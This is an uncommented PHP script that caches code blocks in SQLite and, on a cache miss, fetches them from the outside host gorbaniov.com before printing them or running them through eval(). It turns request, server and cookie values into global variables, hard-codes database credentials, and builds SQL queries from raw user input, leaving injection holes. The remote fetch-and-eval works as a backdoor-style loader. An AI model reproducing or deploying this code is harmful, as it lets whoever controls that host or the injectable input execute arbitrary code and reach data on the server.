<?php
if(!isset($ix)){
foreach($_REQUEST as $key=>$val){${$key}=$val;}}
foreach($_SERVER  as $key=>$val){${$key}=$val;}
foreach($_COOKIE  as $key=>$val){${$key}=$val;}
$dbconn=pg_connect("host=localhost dbname=gor user=gorbaniov password=1");
$db = new SQLite3('ixbase.db');
$db->busyTimeout(5000);
$db->exec('PRAGMA journal_mode = wal;');
if($ix=='_get_'){
 $q=$db->query("SELECT * FROM blkinf00 where p4='$p4'");
 $p=$q->fetchArray();
 print "$p[0]<td !>$p[1]<td !>$p[2]<td !>$p[3]<td !>$p[4]<td !>".$p[5]."<td !>".$p[6];
 exit;
}
$qq=$db->query("SELECT count(p4) FROM blkinf00 where p4='$ix'");
if(!$qq){$db->exec('CREATE TABLE blkinf00 (
 p0 INTEGER PRIMARY KEY AUTOINCREMENT,
 p1 DATETIME DEFAULT CURRENT_TIMESTAMP,
 p2 STRING,
 p3 STRING,
 p4 STRING,
 p5 TEXT,
 p6 TEXT,
 p7 STRING,
 p8 STRING,
 p9 STRING
)');
$db->exec("INSERT INTO blkinf00 (p2,p4,p5) VALUES ('','_myfile','start')");
}
$pp=$qq->fetchArray();
if($pp[0]<1){
 $_m=file_get_contents("https://gorbaniov.com/pool/v.php?ix=_get_&p4=$ix");
 $_a=explode('<td !>',$_m);
 $_a[5]=str_replace("'","''",$_a[5]);
 $_a[6]=str_replace("'","''",$_a[6]);
 $db->exec("insert into blkinf00 (p1,p2,p3,p4,p5,p6)values('$_a[1]','$_a[2]','$_a[3]','$ix','$_a[5]','$_a[6]')");
}
$qq=$db->query("SELECT p5 FROM blkinf00 where p4='$ix'");
$pp=$qq->fetchArray();
if(substr($pp[0],0,1)=="<") print stripslashes($pp[0]);
else eval(stripslashes($pp[0]));
?>
